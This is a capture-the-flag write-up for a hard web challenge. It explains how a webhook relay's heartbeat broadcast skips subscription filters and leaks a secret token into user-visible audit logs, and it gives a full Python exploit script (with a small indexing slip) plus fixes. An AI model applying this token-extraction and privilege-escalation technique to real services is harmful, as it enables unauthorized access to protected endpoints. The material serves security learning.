# Challenge - Crosstalk 

- Category: Web  
- Difficulty: Hard  

Crosstalk is a hard web challenge built around a Flask‑based webhook relay service called **HookRelay**. Users can register, authenticate with JWTs, create subscriptions with URL templates, and inspect audit logs of dispatched events. A privileged **control‑plane** endpoint at `/api/v2/admin/control` requires a secret `HEARTBEAT_TOKEN` passed via `X-Heartbeat-Token`. The trick is that a background `system.heartbeat` event leaks this token into user‑visible audit logs because of a faulty broadcast implementation, and we can exfiltrate it using a crafted subscription and a short Python script.

---

## 1. High‑Level Idea

- The app has a background heartbeat loop that emits `system.heartbeat` events every 60 seconds.
- The heartbeat event carries a secret `HEARTBEAT_TOKEN` in `actor.context.continuation_id`.
- Normal subscriptions are filtered by event type (e.g. `user.created`, `webhook.delivered`) and **cannot** subscribe directly to `system.*` events.
- However, the audit broadcast function **renders all subscriptions’ URL templates** against the heartbeat event, ignoring their filters.
- The rendered URL for that heartbeat is stored in the audit log as `rendered_url` and is visible to the user via `/api/v2/audit/dispatches`.
- If our URL template references `{{actor.context.continuation_id}}`, the heartbeat will render a URL containing the `HEARTBEAT_TOKEN`.
- We read the audit log, extract the token, and call `/api/v2/admin/control` with `X-Heartbeat-Token: <token>` to get the flag.

---

## 2. Application Overview

Core components (in the provided source):

- **Auth** (`/api/auth/register`):
  - Register a user with a username.
  - Returns a JWT and a `user_id`.
  - Subsequent API calls use `Authorization: Bearer <token>`.

- **Subscriptions** (`/api/v2/subscriptions`):
  - Authenticated users can create subscriptions with:
    - `name`
    - `url_template` (templated string)
    - `filter` (event type filter, e.g. `user.created`)
  - `ALLOWED_FILTERS` excludes `system.*` to prevent direct subscription to heartbeat events.

- **Dispatch / Audit**:
  - Normal events go through `dispatch_event`, which:
    - Filters subscriptions based on `filter`.
    - Renders their `url_template` with the event data.
    - Records dispatch info and `rendered_url` in the audit log.
  - Heartbeat events go through `record_system_broadcast`, which:
    - Iterates **all** subscriptions.
    - Renders each `url_template` with the heartbeat event, **ignoring filter**.
    - Records a `system.heartbeat` audit entry per subscription.

- **Heartbeat Loop**:
  - Every ~60 seconds, emits a `system.heartbeat` event like:

    ```json
    {
      "type": "system.heartbeat",
      "actor": {
        "context": {
          "continuation_id": "<HEARTBEAT_TOKEN>"
        }
      }
    }
    ```

- **Control Plane** (`/api/v2/admin/control`):
  - Protected by a header: `X-Heartbeat-Token`.
  - Only returns the flag if the header matches the secret `HEARTBEAT_TOKEN` generated at startup.

There are other interesting bugs (JWT alg confusion, GraphQL PIN brute‑force, SQLi in legacy search), but the intended path is through the heartbeat token leak.

---

## 3. Vulnerability: Filter Bypass in Heartbeat Broadcast

Normal dispatch path (simplified):

```python
def dispatch_event(event):
    subs = [s for s in subscriptions if filter_matches(s.filter, event["type"])]
    for sub in subs:
        rendered = render_template(sub.url_template, event)
        record_dispatch(sub, event, rendered)
```

Heartbeat broadcast path:

```python
def record_system_broadcast(event):
    for sub in get_all_subscriptions():
        rendered = render_template(sub.url_template, event)
        record_dispatch(sub, event, rendered)
```

Key differences:

- `dispatch_event` filters subscriptions by event type (`filter_matches`).
- `record_system_broadcast` **does not** filter; it blindly renders every subscription’s template against the heartbeat event.

Consequences:

- Even though users cannot configure filters like `system.heartbeat`, their subscriptions still get rendered during the heartbeat.
- If the subscription’s template references fields inside the heartbeat payload (such as `actor.context.continuation_id`), those values appear in `rendered_url`.
- The audit log entry for `system.heartbeat` is visible via `/api/v2/audit/dispatches`, so any user can read their subscription’s `rendered_url` and thus see the secret token.

This is a classic case of **side‑channel leakage through audit logging** plus a **filter bypass**.

---

## 4. My Exploit Script

To automate the exploit, I used this Python script:

```python
#!/usr/bin/env python3
import re
import sys
import time
import secrets
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST = sys.argv.rstrip("/") if len(sys.argv) > 1 else "https://09292adac643a29d.chal.ctf.ae"[1]

s = requests.Session()
s.verify = False

print(f"[+] Target: {HOST}")

# 1. Register normal user
username = "brau_" + secrets.token_hex(4)
r = s.post(
    f"{HOST}/api/auth/register",
    json={"username": username},
    timeout=15,
)

print("[+] Register:", r.status_code)
if r.status_code != 200:
    print(r.text)
    sys.exit(1)

data = r.json()
token = data["token"]
user_id = data["user_id"]

print(f"[+] Username: {username}")
print(f"[+] User ID: {user_id}")

headers = {
    "Authorization": f"Bearer {token}",
}

# 2. Create subscription that leaks heartbeat continuation_id into rendered_url
template = "https://relay.example/{{actor.context.continuation_id}}/{{type}}/{{region}}"

r = s.post(
    f"{HOST}/api/v2/subscriptions",
    headers=headers,
    json={
        "name": "heartbeat-leak",
        "url_template": template,
        "filter": "user.created"
    },
    timeout=15,
)

print("[+] Create subscription:", r.status_code)
print(r.text)

if r.status_code not in (200, 201):
    sys.exit(1)

# 3. Poll audit log until system heartbeat appears
heartbeat_token = None

print("[+] Waiting for system heartbeat in audit log...")

for i in range(90):
    r = s.get(
        f"{HOST}/api/v2/audit/dispatches",
        headers=headers,
        timeout=15,
    )

    if r.status_code != 200:
        print("[-] Audit error:", r.status_code, r.text)
        sys.exit(1)

    logs = r.json()

    for entry in logs:
        if entry.get("event_type") == "system.heartbeat":
            rendered = entry.get("rendered_url", "")
            print("[+] Heartbeat audit row found:")
            print(rendered)

            m = re.search(r"https://relay\.example/([0-9a-f]{48})/", rendered)
            if m:
                heartbeat_token = m.group(1)
                break

    if heartbeat_token:
        break

    if i % 5 == 0:
        print(f"[+] Still polling... logs={len(logs)}")

    time.sleep(1)

if not heartbeat_token:
    print("[-] No heartbeat token found. Run again or wait a bit more.")
    sys.exit(1)

print(f"[+] HEARTBEAT_TOKEN: {heartbeat_token}")

# 4. Use leaked token on control-plane endpoint
r = s.get(
    f"{HOST}/api/v2/admin/control",
    headers={"X-Heartbeat-Token": heartbeat_token},
    timeout=15,
)

print("[+] Control plane response:")
print(r.status_code)
print(r.text)
```

Let’s break down what it does.

---

## 5. Exploit Flow Step‑by‑Step

### Step 1: Register User and Obtain JWT

We register a random user to get a valid JWT for authenticated API calls:

```python
username = "brau_" + secrets.token_hex(4)
r = s.post(
    f"{HOST}/api/auth/register",
    json={"username": username},
    timeout=15,
)
data = r.json()
token = data["token"]
user_id = data["user_id"]
headers = {"Authorization": f"Bearer {token}"}
```

The response includes:

- `token`: JWT to be used in `Authorization: Bearer ...`.
- `user_id`: internal identifier (not strictly required for the exploit).

### Step 2: Create a Malicious Subscription

We create a subscription with a URL template that **intentionally references the heartbeat token field**:

```python
template = "https://relay.example/{{actor.context.continuation_id}}/{{type}}/{{region}}"

r = s.post(
    f"{HOST}/api/v2/subscriptions",
    headers=headers,
    json={
        "name": "heartbeat-leak",
        "url_template": template,
        "filter": "user.created"
    },
    timeout=15,
)
```

Notes:

- `filter` is set to `user.created` — a legitimate filter in `ALLOWED_FILTERS`.
- Because of the bug in `record_system_broadcast`, this subscription will still be rendered for `system.heartbeat` events.
- When the heartbeat fires, the URL template renders as:

  ```text
  https://relay.example/<HEARTBEAT_TOKEN>/<type>/<region>
  ```

  and is logged as `rendered_url` in the audit log.

### Step 3: Poll Audit Log and Extract HEARTBEAT_TOKEN

We poll `/api/v2/audit/dispatches` with our JWT until we see a `system.heartbeat` entry:

```python
heartbeat_token = None

for i in range(90):
    r = s.get(
        f"{HOST}/api/v2/audit/dispatches",
        headers=headers,
        timeout=15,
    )
    logs = r.json()

    for entry in logs:
        if entry.get("event_type") == "system.heartbeat":
            rendered = entry.get("rendered_url", "")
            m = re.search(r"https://relay\.example/([0-9a-f]{48})/", rendered)
            if m:
                heartbeat_token = m.group(1)
                break

    if heartbeat_token:
        break

    time.sleep(1)
```

Details:

- We allow up to ~90 seconds to cover at least one heartbeat cycle.
- For each `system.heartbeat` entry, we inspect `rendered_url`.
- The regex `([0-9a-f]{48})` matches the 24‑byte hex token (`secrets.token_hex(24)` → 48 hex chars).
- Once matched, we store it as `heartbeat_token`.

If no token is found within the timeout, we bail out and recommend retrying — in practice, a heartbeat shows up within 60–70 seconds.

### Step 4: Call Admin Control Plane with Token

Finally, we hit the control plane endpoint using the leaked token:

```python
r = s.get(
    f"{HOST}/api/v2/admin/control",
    headers={"X-Heartbeat-Token": heartbeat_token},
    timeout=15,
)
print(r.status_code)
print(r.text)
```

The server checks:

- If `X-Heartbeat-Token` equals the internal `HEARTBEAT_TOKEN`.
- On success, it returns a JSON object containing the flag.

This completes the attack chain:

1. User registration → JWT.
2. Create subscription with template pointing to `actor.context.continuation_id`.
3. Wait for heartbeat → token rendered into audit log.
4. Extract token from `rendered_url`.
5. Use token to access `/api/v2/admin/control`.

---

## 6. Why Other Vulnerabilities Are Red Herrings

The challenge includes several additional issues:

- **JWT algorithm confusion** (RS256 vs HS256).
- **GraphQL PIN brute‑force** via query batching.
- **SQL injection** in a legacy search endpoint.

These can lead to elevated roles or access to legacy flag endpoints, but they:

- Complicate the exploit.
- Are not necessary once you understand the heartbeat broadcast bug.
- Serve as distractions from the intended “crosstalk” between event systems and audit logging.

The clean, intended path is to leverage the **audit broadcast filter bypass** to leak the `HEARTBEAT_TOKEN`.

---

## 7. Lessons and Mitigation

Key lessons:

- **Audit logs can leak secrets**: Logging fully rendered URLs for system events into user‑visible audit streams is dangerous.
- **Filter enforcement must be consistent**: If normal dispatch enforces filters, special‑case broadcast functions must do so as well.
- **Secrets should not live in generic event payloads**: Sensitive tokens like `HEARTBEAT_TOKEN` should be kept out of data structures that can flow into user‑visible templates.

Mitigations:

1. Make `record_system_broadcast` respect filters:

   ```python
   def record_system_broadcast(event):
       for sub in get_all_subscriptions():
           if not filter_matches(sub.filter, event["type"]):
               continue
           rendered = render_template(sub.url_template, event)
           record_dispatch(sub, event, rendered)
   ```

   Combined with `system.*` not being in `ALLOWED_FILTERS`, no user subscriptions would ever see the heartbeat.

2. Redact or omit `rendered_url` for system events in audit data visible to regular users.

3. Avoid placing `HEARTBEAT_TOKEN` inside the generic event data passed through user‑templated rendering; use a separate secure channel or server‑side state.

---

## 8. Summary

- Crosstalk’s core bug is a **filter bypass in the heartbeat audit broadcast**.
- We create a subscription whose template references `{{actor.context.continuation_id}}`.
- The heartbeat loop renders that template and logs a URL containing the secret `HEARTBEAT_TOKEN`.
- We read the audit log, extract the token from `rendered_url`, and use it in `X-Heartbeat-Token` to access `/api/v2/admin/control`.
- The provided Python script automates registration, subscription creation, heartbeat polling, token extraction, and control‑plane access, making this a concise, reliable exploit path for a hard web challenge.
